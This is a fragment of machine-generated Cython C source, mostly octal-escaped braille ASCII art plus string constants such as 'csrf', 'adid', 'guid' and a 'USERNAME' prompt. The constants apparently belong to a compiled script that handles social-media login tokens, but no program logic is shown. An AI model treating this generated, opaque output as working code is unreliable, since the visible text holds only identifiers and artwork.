\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\237\342\243\260\342\240\217\342\240\200\342\242\200\342\243\276\342\243\277\342\243\277\342\243\277\342\243\277\342\243\267\342\241\204\342\240\200\342\240\271\342\243\206\342\240\271\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\217\342\242\260\342\240\217\342\240\200\342\242\200\342\243\276\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\200\342\240\200\342\240\270\342\241\206\342\242\271\342\243\277\342\243\277\342\243\277\342\243""\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\237\342\242\260\342\240\217\342\240\200\342\242\200\342\243\276\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\267\342\241\204\342\240\200\342\240\271\342\243\206\342\240\271\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\240\217\342\243\260\342\240\217\342\240\200\342\242\240\342\243\276\342\243\277\342\243\277\342\243\277\342\240\237\342\240\233\342\240\233\342\240\273\342\242\277\342\243\277\342\243\277\342\243\277\342\241\204\342\240\200\342\240\230\342\243\246\342\240\271\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\240\207\342\243\274\342\240\203\342\240\200\342\242\240\342\243\277\342\243\277\342\243\277\342\241\237\342\240\201\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\271\342\243""\277\342\243\277\342\243\277\342\243\206\342\240\200\342\240\230\342\242\247\342\240\230\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\242\203\342\241\274\342\240\203\342\240\200\342\243\260\342\243\277\342\243\277\342\243\277\342\243\277\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\270\342\243\277\342\243\277\342\243\277\342\243\277\342\243\206\342\240\200\342\240\210\342\242\263\342\241\230\342\242\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\277\342\242\203\342\241\236\342\240\201\342\240\200\342\243\274\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\270\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\247\342\240\200\342\240\210\342\242\263\342\241\210\342\242\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\237\342\242\241\342\241\236\342\240\200\342\242\200\342\243\274\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243""\267\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\270\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\247\342\241\200\342\240\200\342\242\273\342\241\214\342\242\273\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\237\342\242\240\342\241\217\342\240\200\342\242\200\342\243\274\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\276\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\267\342\241\200\342\240\200\342\240\271\342\243\206\342\242\273\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\240\217\342\243\260\342\240\217\342\240\200\342\242\240\342\243\276\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\204\342\240\200\342\240\230\342\243\206\342\240\271\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\240\217\342\243\260\342\240\203\342\240\200\342\242\240\342\243\277\342\243\277\342\243""\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\242\240\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\206\342\240\200\342\240\230\342\242\246\342\240\230\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\240\203\342\241\274\342\240\203\342\240\200\342\243\260\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\242\270\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\206\342\240\200\342\240\210\342\242\247\342\241\230\342\242\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\277\342\242\203\342\241\274\342\240\201\342\240\200\342\243\260\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\242\270\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\247\342\240\200\342\240\210\342\242\263\342\241\210\342\242\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\277\342\242\241\342\241\236\342\240""\201\342\240\200\342\243\274\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\267\342\241\200\342\240\200\342\240\200\342\242\200\342\243\276\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\247\342\241\200\342\240\200\342\242\263\342\241\214\342\242\273\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\237\342\242\241\342\240\237\342\240\200\342\242\200\342\243\274\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\267\342\241\200\342\240\200\342\240\271\342\241\204\342\242\273\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\241\237\342\243\260\342\240\217\342\240\200\342\242\200\342\243\276\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\240\237\342\240\233\342\240\233\342\240\273\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\267\342\241\204\342\240\200\342\240\271\342\243\206\342\240\271\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243""\277\342\243\277\342\241\217\342\242\260\342\241\207\342\240\200\342\242\200\342\243\276\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\277\342\240\201\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\200\342\240\200\342\240\270\342\243\206\342\242\271\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\240\217\342\243\260\342\240\217\342\240\200\342\242\200\342\243\276\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\270\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\267\342\241\204\342\240\200\342\240\271\342\243\206\342\240\271\342\243\277\342\243\277\n\342\243\277\342\240\217\342\243\260\342\240\217\342\240\200\342\242\240\342\243\276\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\267\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\243\274\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243""\277\342\241\204\342\240\200\342\240\230\342\242\246\342\240\271\342\243\277\n\342\240\207\342\241\274\342\240\203\342\240\200\342\243\260\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\266\342\243\266\342\243\266\342\243\266\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\206\342\240\200\342\240\230\342\242\247\342\240\230\n\342\240\200\342\243\207\342\240\200\342\240\200\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\211\342\240\200\342\240\200\342\243\270\342\240\207\n\342\243\247\342\243\210\342\240\263\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240""\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\266\342\240\226\342\242\213\342\243\274\n\342\243\277\342\243\277\342\243\267\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\266\342\243\276\342\243\277\342\243\277\n\n";
static const char __pyx_k_adid[] = "adid";
static const char __pyx_k_amsc[] = "amsc";
static const char __pyx_k_args[] = "args";
static const char __pyx_k_blue[] = "blue";
static const char __pyx_k_char[] = "char";
static const char __pyx_k_code[] = "\n\360\235\227\250\360\235\227\246\360\235\227\230\360\235\227\245\360\235\227\241\360\235\227\224\360\235\227\240\360\235\227\230 : <code>";
static const char __pyx_k_cors[] = "cors";
static const char __pyx_k_csrf[] = "csrf";
static const char __pyx_k_cyan[] = "cyan";
static const char __pyx_k_data[] = "data";
static const char __pyx_k_date[] = "date";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_font[] = "font";
static const char __pyx_k_fowg[] = "fowg";
static const char __pyx_k_fows[] = "fows";
static const char __pyx_k_guid[] = "guid";
static const char __pyx_k_hits[] = "hits";
static const char __pyx_k_host[] = "host";
static const char __pyx_k_hour[] = "hour";
static const char __pyx_k_init[] = "__init__";
static const char __pyx_k_json[] = "json";
static const char __pyx_k_logo[] = "logo";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_memo[] = "memo";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_none[] = "none";
static const char __pyx_k_null[] = "\",null,\"";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_post[] = "post";
static const char __pyx_k_pppp[] = "pppp";
static const char __pyx_k_read[] = "read";
static const char __pyx_k_red6[] = "red6";
static const char __pyx_k_res1[] = "res1";
static const char __pyx_k_rest[] = "rest";
static const char __pyx_k_rich[] = "rich";
static const char __pyx_k_s_ss[] = "\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\221\342\242\246\342\241\210\342\240\262\342\243\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\273\342\240\267\342\243\266\342\240\242\342\240\244\342\242\204\342\243\200\342\240\200\342\240\200\342\240\231\342\242\206\342\240\210\342\240\242\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\231\342\240\242\342\243\204\342\240\210\342\240\231\342\240\262\342\242\204\342\241\200\342\240\261\342\243\204\342\240\221\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\222\342\240\222\342\240\222\342\240\222\342\240\202\342\240\244\342\240\244\342\240\244\342\240\244\342\243\200\342\243\200\342\243\200\342\240\200\342\240\200\342\240\200""\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\263\342\243\204\342\240\200\342\240\200\342\240\231\342\240\242\342\241\230\342\242\246\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\242\262\342\241\247\342\242\204\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\211\342\240\211\342\240\221\342\240\222\342\240\262\342\240\244\342\240\244\342\243\200\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\242\243\342\240\200\342\240\200\342\240\200\342\240\231\342\243\206\342\242\263\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\241\277\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\231\342\240\262\342\242\244\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\243\342\240\200\342\240\200\342\240\200\342\240\230\342\241\206\342\240\261\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\241\207\342\240\271\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\220\342\240\242\342\240\204\342\243\210\342\240\221\342\240\246\342\243\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\230\342\241\207\342\240\200\342\240\200""\342\240\200\342\242\271\342\240\200\342\240\271\342\241\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\242\204\342\241\200\342\240\200\342\240\200\342\243\207\342\240\200\342\240\261\342\243\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\244\342\243\244\342\243\204\342\241\200\342\240\200\342\240\200\342\240\200\342\240\211\342\240\223\342\240\242\342\242\235\342\241\242\342\243\204\342\241\200\342\242\240\342\241\207\342\240\200\342\240\200\342\240\200\342\242\270\342\240\200\342\240\200\342\240\271\342\241\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\243\204\342\240\231\342\240\242\342\241\200\342\240\270\342\241\204\342\240\200\342\240\210\342\240\242\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\270\342\243\267\342\243\246\342\240\210\342\240\211\342\240\211\342\240\211\342\242\222\342\243\246\342\243\200\342\240\200\342\242\210\342\243\240\342\240\237\342\241\237\342\240\200\342\240\200\342\240\200\342\240\200\342\241\274\342\240\200\342\240\200\342\240\200\342\240\271\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\242\273\342\243\246\342\240\200\342\240\210\342\240\202\342\240\271\342\243\204\342\240\200\342\240\200\342\240\210\342\240\221\342\240\222\342\240\244\342\242\204\342\243\200\342\243\200\342\243\200\342\243\200\342\243\200\342\243\200\342\243\270\342\243\247\342\240\244\342\240\226\342\240\232\342\240\211\342\240\211\342\240\213\342\242\211\342\240\217\342\240\201\342\240\200\342\240\212\342\240\200\342\240\200\342\240\200\342\240\200\342\242\260\342\241\203\342\240\200\342\240\200\342\240\200\342\240\200\342\242\263\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\242\273\342\243""\247\342\241\200\342\240\200\342\240\200\342\240\230\342\242\246\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\275\342\240\217\342\240\200\342\242\240\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\270\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\260\342\240\237\342\240\211\342\240\223\342\242\244\342\241\200\342\240\200\342\240\210\342\243\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\271\342\243\267\342\241\204\342\240\200\342\240\200\342\240\200\342\240\211\342\240\262\342\242\204\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\241\217\342\240\200\342\243\200\342\243\270\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\263\342\243\204\342\241\200\342\242\200\342\243\200\342\240\244\342\240\232\342\240\211\342\240\221\342\240\242\342\243\200\342\240\200\342\240\261\342\241\204\342\240\200\342\240\270\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\230\342\242\277\342\243\206\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\211\342\240\222\342\240\240\342\240\244\342\242\204\342\243\200\342\243\200\342\241\260\342\240\200\342\240\222\342\242\242\342\240\222\342\240\211\342\240\201\342\240\201\342\241\240\342\240\244\342\242\204\342\240\200\342\240\230\342\240\273\342\241\227\342\242\244\342\241\200\342\240\200\342\240\200\342\240\221\342\242\246\342\241\230\342\242\246\342\240\200\342\242\207\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\231\342\240\253\342\242\267\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\202\342\240\220\342\243\246\342\240\264\342\242\267\342\243""\244\342\243\204\342\243\230\342\243\206\342\243\200\342\243\240\342\243\236\342\243\267\342\240\222\342\240\222\342\240\200\342\240\200\342\242\240\342\242\247\342\243\200\342\240\210\342\240\263\342\242\204\342\241\200\342\240\200\342\240\200\342\240\200\342\240\231\342\242\246\342\243\263\342\243\274\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\223\342\240\246\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\223\342\242\204\342\243\270\342\240\233\342\242\277\342\240\201\342\241\206\342\240\210\342\240\253\342\241\211\342\240\200\342\240\200\342\241\234\342\240\200\342\243\217\342\240\200\342\240\231\342\242\277\342\243\202\342\241\200\342\242\263\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\231\342\243\277\342\241\206\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\231\342\240\262\342\242\204\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\271\342\241\200\342\242\270\342\241\200\342\243\270\342\241\237\342\243\242\342\243\210\342\240\200\342\240\270\342\240\200\342\240\200\342\242\271\342\241\200\342\240\200\342\240\200\342\240\271\342\243\235\342\240\202\342\240\261\342\243\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\230\342\241\207\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\221\342\240\222\342\240\244\342\243\244\342\243\200\342\243\271\342\243\246\342\240\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\267\342\240\200\342\240\200\342\243\240\342\240\236\342\242\260\342\240\200\342\240\200\342\240""\200\342\240\230\342\243\246\342\241\200\342\240\210\342\240\263\342\241\200\342\240\200\342\240\200\342\242\240\342\240\201\342\241\204\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\247\342\240\210\342\240\271\342\243\277\342\240\277\342\243\277\342\241\277\342\240\233\342\240\211\342\243\240\342\240\236\342\240\201\342\240\200\342\241\270\342\240\200\342\242\204\342\240\200\342\240\200\342\240\230\342\241\217\342\240\262\342\241\200\342\240\261\342\241\200\342\240\200\342\241\270\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200  \342\240\200\342\240\200\342\240\230\342\241\204\342\240\200\342\241\277\342\240\200\342\240\210\342\240\201\342\240\200\342\241\264\342\240\211\342\240\200\342\240\200\342\242\240\342\240\207\342\240\200\342\240\230\342\241\204\342\240\200\342\243\200\342\240\274\342\240\222\342\240\276\342\242\246\342\243\231\342\243\244\342\241\207\342\242\270\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\261\342\241\200\342\240\223\342\241\226\342\242\262\342\240\222\342\240\213\342\240\200\342\240\200\342\240\200\342\242\200\342\241\236\342\240\200\342\240\200\342\240\200\342\241\250\342\240\212\342\240\263\342\243\204\342\240\200\342\240\200\342\240\200\342\240\210\342\242\273\342\240\201\342\240\230\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200 